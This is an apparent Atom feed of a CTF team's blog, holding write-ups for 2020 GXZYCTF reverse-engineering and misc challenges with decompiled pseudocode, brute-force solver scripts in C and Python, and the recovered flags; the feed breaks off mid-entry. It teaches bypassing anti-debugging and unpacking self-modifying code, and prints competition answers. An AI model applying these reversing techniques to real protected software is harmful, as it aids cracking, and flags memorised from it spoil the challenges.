<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BOI Team</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://boiteam.github.io/"/>
  <updated>2020-03-21T12:42:15.445Z</updated>
  <id>https://boiteam.github.io/</id>
  
  <author>
    <name>BOI Team</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020 GXZYCTF cyclegraph</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_cyclegraph/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_cyclegraph/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T12:42:15.445Z</updated>
    
    <content type="html"><![CDATA[<p><strong>第一层考点：dump内存</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dword_403370 = 0;</span><br><span class="line">v1 = &amp;unk_403384;</span><br><span class="line">byte_403374 = 48;</span><br><span class="line">v2 = 0;</span><br><span class="line">dword_403378 = (int)&amp;unk_403380;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">  v3 = dword_402178[v2];</span><br><span class="line">  ++v2;</span><br><span class="line">  *(v1 - 1) = v3;</span><br><span class="line">  *v1 = (char *)&amp;unk_403380 + 12 * dword_402274[v2];</span><br><span class="line">  v1[1] = (char *)&amp;unk_403380 + 12 * dword_4021F4[v2];</span><br><span class="line">  v1 += 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在OD中执行完后dump出403348内存的值<br><strong>第二层考点：OD下断</strong><br>核心算法</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">v4 = dword_403370;</span><br><span class="line">v5 = byte_403374;</span><br><span class="line">v6 = 5;</span><br><span class="line">v7 = dword_403378;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">  v11 = *(&amp;v12 + v6);</span><br><span class="line"> <span class="built_in"> if </span>( *(_DWORD *)v7 + v5 == v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(_DWORD *)(v7 + 4);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in"> if </span>( v5 - *(_DWORD *)v7 != v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401020(<span class="string">"This is not flag~\n"</span>, v10);</span><br><span class="line">     <span class="keyword"> system</span>(<span class="string">"pause"</span>);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = *(_DWORD *)(v7 + 8);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(&amp;v12 + v6);</span><br><span class="line">  ++v4;</span><br><span class="line">  ++v6;</span><br><span class="line">  byte_403374 = v5;</span><br><span class="line">  dword_403378 = v7;</span><br><span class="line">  dword_403370 = v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后v7要为0x4034f4。根据dump出的数据在两处if处下断,人工逆运算便可得出flag<br>flag{d8b0bc97a6c0ba27}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;第一层考点：dump内存&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight smali&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;dword_403370 = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v1 = &amp;amp;unk_403384;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;byte_403374 = 48;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;v2 = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dword_403378 = (int)&amp;amp;unk_403380;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;do&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v3 = dword_402178[v2];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ++v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *(v1 - 1) = v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *v1 = (char *)&amp;amp;unk_403380 + 12 * dword_402274[v2];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v1[1] = (char *)&amp;amp;unk_403380 + 12 * dword_4021F4[v2];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  v1 += 3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="下断点调试" scheme="https://boiteam.github.io/tags/%E4%B8%8B%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF !ftcx</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_fxck!/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_fxck!/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T12:39:50.967Z</updated>
    
    <content type="html"><![CDATA[<p>密文生成和加密运算是两个不同<br>密文是通过一系列加密运算直接生成的，dump出来就能用<br><strong>第一层考点：魔改base58</strong><br>里面稍微加了点混淆，且表也改了，因此不太容易看出这是base58的算法，但有一个显著的特征，他总是在在进行%58操作，因此通过这一特征也可以联想到base58<br>附魔改base58脚本</p><p><img src="/2020/03/20/2020_GXZCTF_fxck!/2020_GXZCTF_fxck!%5Cimage-20200321203901085.png" alt="image-20200321203901085"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;密文生成和加密运算是两个不同&lt;br&gt;密文是通过一系列加密运算直接生成的，dump出来就能用&lt;br&gt;&lt;strong&gt;第一层考点：魔改base58&lt;/strong&gt;&lt;br&gt;里面稍微加了点混淆，且表也改了，因此不太容易看出这是base58的算法，但有一个显著的特征，他总是在在进行%58操作，因此通过这一特征也可以联想到base58&lt;br&gt;附魔改base58脚本&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/20/2020_GXZCTF_fxck!/2020_GXZCTF_fxck!%5Cimage-20200321203901085.png&quot; alt=&quot;image-20200321203901085&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="算法求解" scheme="https://boiteam.github.io/tags/%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF 天津垓</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T12:37:59.643Z</updated>
    
    <content type="html"><![CDATA[<p>有两层加密，第一次的正确作为smc解密的密钥<br><strong>第一层考点：去反调试</strong><br>64位的程序发现有反调试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 sub_10040162B()</span><br><span class="line">&#123;</span><br><span class="line">  _BOOL8 result; <span class="regexp">//</span> rax</span><br><span class="line"></span><br><span class="line">  result = sub_100401195();</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有反调试直接nop掉<br><strong>第二层考点：算法求解</strong><br>找到关键算法后直接爆破</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char <span class="type">key</span>[] = <span class="string">"Rising_Hopper!"</span>;</span><br><span class="line">int result[] = &#123; <span class="number">17</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">20</span>,<span class="number">42</span>,<span class="number">59</span>,<span class="number">47</span>,<span class="number">3</span>,<span class="number">47</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">72</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">16</span> &#125;;</span><br><span class="line">char flag;</span><br><span class="line">for (int i = <span class="number">0</span>; i &lt;= <span class="number">17</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">for (flag = <span class="number">0x20</span>; flag &lt;= <span class="number">0x7e</span>; flag++)</span><br><span class="line">&#123;</span><br><span class="line">if ((~(flag &amp; <span class="type">key</span>[i % <span class="number">14</span>]) &amp; (flag | <span class="type">key</span>[i % <span class="number">14</span>])) == result[i])</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"%c"</span>,flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Caucasus@s_ability<br><strong>第三层考点：smc</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">lpAddress = a1;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v8 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( strlen(Str) != <span class="number">18</span> )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !VirtualProtect(lpAddress, v7, <span class="number">0</span>x40u, &amp;flOldProtect) )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % <span class="number">18</span> + v8);</span><br><span class="line">  result = VirtualProtect(lpAddress, v7, flOldProtect, &amp;flOldProtect);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>这是利用第一层密文对代码进行加密，执行完后dump出内存，重新利用IDAf5便可找到关键算法</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span> result[]=&#123;<span class="number">0x1EA272</span>,<span class="number">0x206FC4</span>,<span class="number">0x1D2203</span>,<span class="number">0x1EEF55</span>,<span class="number">0x24F111</span>,<span class="number">0x193A7C</span>,<span class="number">0x1F3C38</span>,<span class="number">0x21566D</span>,<span class="number">0x2323BF</span>,<span class="number">0x2289F9</span>,<span class="number">0x1D2203</span>,<span class="number">0x21098A</span>,<span class="number">0x1E08AC</span>,<span class="number">0x223D16</span>,<span class="number">0x1F891B</span>,<span class="number">0x2370A2</span>,<span class="number">0x1E558F</span>,<span class="number">0x223D16</span>,<span class="number">0x1C883D</span>,<span class="number">0x1F891B</span>,<span class="number">0x2289F9</span>,<span class="number">0x1C883D</span>,<span class="number">0xEB773</span>,<span class="number">0xE6A90</span>,<span class="number">0xE6A90</span>,<span class="number">0xE6A90</span>,<span class="number">0xB1CCF</span>,<span class="number">0x1C883D</span>,<span class="number">0x2289F9</span>,<span class="number">0x22D6DC</span>,<span class="number">0x223D16</span>,<span class="number">0x21566D</span>,<span class="number">0x21098A</span>,<span class="number">0x1EEF55</span>,<span class="number">0x1E558F</span>,<span class="number">0x223D16</span>,<span class="number">0x1C883D</span>,<span class="number">0x22D6DC</span>,<span class="number">0x1F3C38</span>,<span class="number">0x1D2203</span>,<span class="number">0x21098A</span>,<span class="number">0x1C883D</span>,<span class="number">0x24A42E</span>,<span class="number">0x1E558F</span>,<span class="number">0x223D16</span>,<span class="number">0x21566D</span>,<span class="number">0xD83E7</span>,<span class="number">0x21566D</span>,<span class="number">0x21098A</span>,<span class="number">0x1E558F</span>,<span class="number">0x258AD7</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">51</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0x20</span>; j &lt;= <span class="number">0x7e</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0x4ce3</span> *j % (unsigned <span class="built_in">int</span>)<span class="number">0x8000000B</span> == result[i])</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"%c"</span>,j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">flag&#123;Thousandriver_is_1000%_stronger_than_zero-one&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有两层加密，第一次的正确作为smc解密的密钥&lt;br&gt;&lt;strong&gt;第一层考点：去反调试&lt;/strong&gt;&lt;br&gt;64位的程序发现有反调试&lt;/p&gt;
&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;_BOOL8 sub_10040162B()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  _BOOL8 result; &lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt; rax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  result = sub_100401195();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( (_DWORD)result )&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return result;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="算法求解" scheme="https://boiteam.github.io/tags/%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
    
      <category term="反调试" scheme="https://boiteam.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
      <category term="smc" scheme="https://boiteam.github.io/tags/smc/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF easyparse</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_easyparse/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_easyparse/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T12:41:02.457Z</updated>
    
    <content type="html"><![CDATA[<p>题目在比赛的时候没做出来，赛后复盘发现硬件断点下错了，梳理逻辑后发现很简单。<br><strong>第一层考点：下准断点</strong><br>这是一个rust编译的程序，因此可读性较差，先找到输出对输出函数下断点<br>_$LT$std..io..stdio..Stdin$u20$as$u20$std..io..Read$GT$::read::h174af29f99bd8aef<br>每次执行这个函数都是从缓冲区读入一个字节，当所有字节都读完之后再一个一个字节验证，很容易联想到pintools爆破求解<br>但稍微耐心点调试发现加密过程很简单<br>密文是程序执行过程中生成的也需要dump<br>解密脚本如下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = [<span class="number">144</span>, <span class="number">332</span>, <span class="number">28</span>, <span class="number">240</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">240</span>, <span class="number">208</span>, <span class="number">88</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">52</span>, <span class="number">240</span>, <span class="number">276</span>, <span class="number">240</span>, <span class="number">128</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">52</span>, <span class="number">8</span>, <span class="number">240</span>, <span class="number">144</span>, <span class="number">68</span>, <span class="number">48</span>, <span class="number">80</span>, <span class="number">92</span>, <span class="number">44</span>, <span class="number">264</span>, <span class="number">240</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">if</span>((c^<span class="number">0x63</span>)&lt;&lt;(<span class="number">2</span>&amp;<span class="number">0x3f</span>)==i):</span><br><span class="line">flag+=chr(c)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目在比赛的时候没做出来，赛后复盘发现硬件断点下错了，梳理逻辑后发现很简单。&lt;br&gt;&lt;strong&gt;第一层考点：下准断点&lt;/strong&gt;&lt;br&gt;这是一个rust编译的程序，因此可读性较差，先找到输出对输出函数下断点&lt;br&gt;_$LT$std..io..stdio..Stdin$u20$as$u20$std..io..Read$GT$::read::h174af29f99bd8aef&lt;br&gt;每次执行这个函数都是从缓冲区读入一个字节，当所有字节都读完之后再一个一个字节验证，很容易联想到pintools爆破求解&lt;br&gt;但稍微耐心点调试发现加密过程很简单&lt;br&gt;密文是程序执行过程中生成的也需要dump&lt;br&gt;解密脚本如下&lt;/p&gt;
&lt;figure class=&quot;highlight angelscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;result = [&lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;332&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;24&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;208&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;276&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;92&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;264&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;240&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;flag=&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; result:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; c &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((c^&lt;span class=&quot;number&quot;&gt;0x63&lt;/span&gt;)&amp;lt;&amp;lt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&amp;amp;&lt;span class=&quot;number&quot;&gt;0x3f&lt;/span&gt;)==i):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			flag+=chr(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="VM" scheme="https://boiteam.github.io/tags/VM/"/>
    
      <category term="rust编译" scheme="https://boiteam.github.io/tags/rust%E7%BC%96%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF 隐藏的信息</title>
    <link href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/"/>
    <id>https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/</id>
    <published>2020-03-17T05:54:17.000Z</published>
    <updated>2020-03-21T11:38:15.345Z</updated>
    
    <content type="html"><![CDATA[<p>二维码补全fff</p><p><img src="/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/clip_image002.gif" alt="IMG_256"></p><p>不是flag</p><p><img src="/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/clip_image004.gif" alt="IMG_256"></p><p>zip伪加密，解得⼀个wav</p><p>audacity打开频谱图，分析前后两段DTMF码：</p><p><img src="/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/clip_image006.jpg" alt="IMG_256"></p><p>得：187485618512，最后base64编码提交</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;二维码补全fff&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/17/2020_GXZCTF_%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/clip_image002.gif&quot; alt=&quot;IMG_256&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://boiteam.github.io/categories/Misc/"/>
    
    
      <category term="Misc_隐写" scheme="https://boiteam.github.io/tags/Misc-%E9%9A%90%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF 武汉加油</title>
